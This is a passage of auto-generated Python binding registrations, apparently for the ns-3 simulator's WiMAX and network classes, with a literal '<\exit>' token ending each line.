[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('ns3::Buffer::Iterator', 'end')])<\exit>
cls.add_method('WriteHtolsbU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteHtolsbU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteHtolsbU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteHtonU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteHtonU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteHtonU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteU64',<\exit>
'void',<\exit>
[param('uint64_t', 'data')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'data')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'data'), param('uint32_t', 'len')])<\exit>
return<\exit>
def register_Ns3ByteTagIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagIterator const &', 'arg0')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::ByteTagIterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagIterator::Item const &', 'arg0')])<\exit>
cls.add_method('GetEnd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStart',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTag',<\exit>
'void',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ByteTagList_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ByteTagList const &', 'o')])<\exit>
cls.add_method('Add',<\exit>
'ns3::TagBuffer',<\exit>
[param('ns3::TypeId', 'tid'), param('uint32_t', 'bufferSize'), param('int32_t', 'start'), param('int32_t', 'end')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::ByteTagList const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('int32_t', 'adjustment'), param('int32_t', 'appendOffset')])<\exit>
cls.add_method('AddAtStart',<\exit>
'void',<\exit>
[param('int32_t', 'adjustment'), param('int32_t', 'prependOffset')])<\exit>
cls.add_method('Begin',<\exit>
'ns3::ByteTagList::Iterator',<\exit>
[param('int32_t', 'offsetStart'), param('int32_t', 'offsetEnd')],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAll',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagListIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagList::Iterator const &', 'arg0')])<\exit>
cls.add_method('GetOffsetStart',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::ByteTagList::Iterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3ByteTagListIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ByteTagList::Iterator::Item const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::TagBuffer', 'buf')])<\exit>
cls.add_instance_attribute('buf', 'ns3::TagBuffer', is_const=False)<\exit>
cls.add_instance_attribute('end', 'int32_t', is_const=False)<\exit>
cls.add_instance_attribute('size', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('start', 'int32_t', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3CallbackBase_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CallbackBase const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetImpl',<\exit>
'ns3::Ptr< ns3::CallbackImplBase >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::CallbackImplBase >', 'impl')],<\exit>
visibility='protected')<\exit>
cls.add_method('Demangle',<\exit>
'std::string',<\exit>
[param('std::string const &', 'mangled')],<\exit>
is_static=True, visibility='protected')<\exit>
return<\exit>
def register_Ns3Cid_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Cid const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint16_t', 'cid')])<\exit>
cls.add_method('Broadcast',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetIdentifier',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('InitialRanging',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsInitialRanging',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsPadding',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Padding',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3CidFactory_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CidFactory const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Allocate',<\exit>
'ns3::Cid',<\exit>
[param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('AllocateBasic',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocateMulticast',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocatePrimary',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('AllocateTransportOrSecondary',<\exit>
'ns3::Cid',<\exit>
[])<\exit>
cls.add_method('FreeCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('IsBasic',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('IsPrimary',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('IsTransport',<\exit>
'bool',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3CsParameters_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CsParameters const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_constructor([param('ns3::CsParameters::Action', 'classifierDscAction'), param('ns3::IpcsClassifierRecord', 'classifier')])<\exit>
cls.add_method('GetClassifierDscAction',<\exit>
'ns3::CsParameters::Action',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketClassifierRule',<\exit>
'ns3::IpcsClassifierRecord',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetClassifierDscAction',<\exit>
'void',<\exit>
[param('ns3::CsParameters::Action', 'action')])<\exit>
cls.add_method('SetPacketClassifierRule',<\exit>
'void',<\exit>
[param('ns3::IpcsClassifierRecord', 'packetClassifierRule')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3DcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBsEirp',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEirxPIrMax',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetBsEirp',<\exit>
'void',<\exit>
[param('uint16_t', 'bs_eirp')])<\exit>
cls.add_method('SetEirxPIrMax',<\exit>
'void',<\exit>
[param('uint16_t', 'rss_ir_max')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3DlFramePrefixIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DlFramePrefixIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPreamblePresent',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRateId',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint16_t', 'length')])<\exit>
cls.add_method('SetPreamblePresent',<\exit>
'void',<\exit>
[param('uint8_t', 'preamblePresent')])<\exit>
cls.add_method('SetRateId',<\exit>
'void',<\exit>
[param('uint8_t', 'rateId')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3EventId_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::EventId const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::EventImpl > const &', 'impl'), param('uint64_t', 'ts'), param('uint32_t', 'context'), param('uint32_t', 'uid')])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetContext',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTs',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsExpired',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsRunning',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekEventImpl',<\exit>
'ns3::EventImpl *',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3IpcsClassifierRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IpcsClassifierRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask'), param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask'), param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh'), param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh'), param('uint8_t', 'protocol'), param('uint8_t', 'priority')])<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_method('AddDstAddr',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask')])<\exit>
cls.add_method('AddDstPortRange',<\exit>
'void',<\exit>
[param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh')])<\exit>
cls.add_method('AddProtocol',<\exit>
'void',<\exit>
[param('uint8_t', 'proto')])<\exit>
cls.add_method('AddSrcAddr',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask')])<\exit>
cls.add_method('AddSrcPortRange',<\exit>
'void',<\exit>
[param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh')])<\exit>
cls.add_method('CheckMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIndex',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPriority',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('uint16_t', 'cid')])<\exit>
cls.add_method('SetIndex',<\exit>
'void',<\exit>
[param('uint16_t', 'index')])<\exit>
cls.add_method('SetPriority',<\exit>
'void',<\exit>
[param('uint8_t', 'prio')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Ipv4Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Ipv4Address const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'address')])<\exit>
cls.add_constructor([param('char const *', 'address')])<\exit>
cls.add_method('CombineMask',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('Deserialize',<\exit>
'ns3::Ipv4Address',<\exit>
[param('uint8_t const *', 'buf')],<\exit>
is_static=True)<\exit>
cls.add_method('Get',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetAny',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSubnetDirectedBroadcast',<\exit>
'ns3::Ipv4Address',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsLocalMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsSubnetDirectedBroadcast',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Mask const &', 'mask')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint32_t', 'address')])<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('char const *', 'address')])<\exit>
return<\exit>
def register_Ns3Ipv4Mask_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Ipv4Mask const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'mask')])<\exit>
cls.add_constructor([param('char const *', 'mask')])<\exit>
cls.add_method('Get',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInverse',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetPrefixLength',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Mask', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'a'), param('ns3::Ipv4Address', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint32_t', 'mask')])<\exit>
return<\exit>
def register_Ns3Ipv6Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char const *', 'address')])<\exit>
cls.add_constructor([param('uint8_t *', 'address')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const &', 'addr')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const *', 'addr')])<\exit>
cls.add_method('CombinePrefix',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Ipv6Prefix const &', 'prefix')])<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('Deserialize',<\exit>
'ns3::Ipv6Address',<\exit>
[param('uint8_t const *', 'buf')],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllHostsMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllNodesMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAllRoutersMulticast',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetAny',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetBytes',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsAllHostsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAllNodesMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAllRoutersMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsAny',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Address const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsLinkLocal',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsLocalhost',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsSolicitedMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('MakeAutoconfiguredAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Mac48Address', 'addr'), param('ns3::Ipv6Address', 'prefix')],<\exit>
is_static=True)<\exit>
cls.add_method('MakeAutoconfiguredLinkLocalAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Mac48Address', 'mac')],<\exit>
is_static=True)<\exit>
cls.add_method('MakeSolicitedAddress',<\exit>
'ns3::Ipv6Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('char const *', 'address')])<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint8_t *', 'address')])<\exit>
return<\exit>
def register_Ns3Ipv6Prefix_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t *', 'prefix')])<\exit>
cls.add_constructor([param('char const *', 'prefix')])<\exit>
cls.add_constructor([param('uint8_t', 'prefix')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'prefix')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const *', 'prefix')])<\exit>
cls.add_method('GetBytes',<\exit>
'void',<\exit>
[param('uint8_t *', 'buf')],<\exit>
is_const=True)<\exit>
cls.add_method('GetLoopback',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetOnes',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetPrefixLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetZero',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Prefix const &', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv6Address', 'a'), param('ns3::Ipv6Address', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3LogComponent_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::LogComponent const &', 'arg0')])<\exit>
cls.add_constructor([param('char const *', 'name')])<\exit>
cls.add_method('Disable',<\exit>
'void',<\exit>
[param('ns3::LogLevel', 'level')])<\exit>
cls.add_method('Enable',<\exit>
'void',<\exit>
[param('ns3::LogLevel', 'level')])<\exit>
cls.add_method('EnvVarCheck',<\exit>
'void',<\exit>
[param('char const *', 'name')])<\exit>
cls.add_method('IsEnabled',<\exit>
'bool',<\exit>
[param('ns3::LogLevel', 'level')],<\exit>
is_const=True)<\exit>
cls.add_method('IsNoneEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Name',<\exit>
'char const *',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Mac48Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('ns3::Mac48Address const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char const *', 'str')])<\exit>
cls.add_method('Allocate',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('ConvertFrom',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('CopyFrom',<\exit>
'void',<\exit>
[param('uint8_t const *', 'buffer')])<\exit>
cls.add_method('CopyTo',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Ipv4Address', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Mac48Address',<\exit>
[param('ns3::Ipv6Address', 'address')],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticast6Prefix',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMulticastPrefix',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsGroup',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('ns3::Address const &', 'address')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3NetDeviceContainer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::NetDevice >', 'dev')])<\exit>
cls.add_constructor([param('std::string', 'devName')])<\exit>
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'a'), param('ns3::NetDeviceContainer const &', 'b')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::NetDeviceContainer', 'other')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::NetDevice >', 'device')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'deviceName')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3NodeContainer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node')])<\exit>
cls.add_constructor([param('std::string', 'nodeName')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c')])<\exit>
